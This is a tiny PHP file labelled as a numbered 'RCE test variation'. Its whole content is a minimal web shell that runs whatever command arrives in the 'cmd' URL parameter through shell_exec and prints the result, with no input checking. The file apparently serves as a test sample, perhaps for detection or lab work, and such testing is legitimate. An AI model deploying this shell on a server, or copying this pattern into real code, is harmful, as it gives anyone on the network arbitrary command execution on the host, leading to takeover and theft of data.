<?php
// RCE test variation #1018
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>